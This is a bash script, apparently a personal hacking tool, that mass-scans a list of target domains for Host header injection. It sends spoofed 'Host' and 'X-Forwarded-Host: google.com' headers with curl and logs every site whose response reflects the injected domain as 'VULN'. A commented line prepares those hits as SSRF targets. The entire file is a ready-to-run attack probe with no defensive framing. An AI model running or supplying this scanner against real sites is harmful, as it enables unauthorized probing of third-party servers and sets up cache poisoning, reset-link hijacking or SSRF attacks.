#!/bin/bash
clear
echo -e "\033[32;1m====================================="
figlet hhi
echo -e "====================================="
echo -e "\033[32;1mHost\033[33;1mHeader\033[34;1mInjection \033[37;1m| \033[32;1mpaktiko1986\033[0m"
echo -e "\033[32;1m====================================="
echo "[+] Total target(s): " $(cat $2 | wc -l)
echo "[+] Payloads: "
echo "    >> Host: google.com"
echo "    >> X-Forwarded-Host: google.com"
echo "    >> Content-Length: 0"
echo -e "=====================================\033[0m"
touch hhi_vulns.txt
if [[ ! $1 == "--d" && $2 == "" ]]; then
	echo "--d: fill with URL target (single domain or subdomain list in file)"
	echo "Example: --d google.com | --d subdomain.txt"
else
	for url in $(cat $2); do curl --max-time 9 -skLI -H "Host: google.com" -H "X-Forwarded-Host: google.com" -H "Content-Length:0" -A "User-Agent: SKH86" $url | grep -q "domain=.google.com" && echo -e "\033[31;1m[-] $url is VULN\033[0m" >> hhi_vulns.txt || echo -e "\033[32m[+] $url is WELL\033[0m";  done
fi
#cat hhi_vulns.txt | awk -F'//' '{print $2}' | awk -F' ' '{print $1}' > ssrf_target_vulns.txt
echo ""
echo -e "\033[32;1m==========================================================\033[0m"
cat hhi_vulns.txt
echo -e "\033[32;1m==========================================================\033[0m"
echo -e "\033[33mTotal vuln site by \033[32;1mHost\033[33;1mHeader\033[34;1mInjection\033[0m =\033[33;1m $(cat hhi_vulns.txt | wc -l)\033[0m"
echo -e "\033[32;1m==========================================================\033[0m"
echo ""
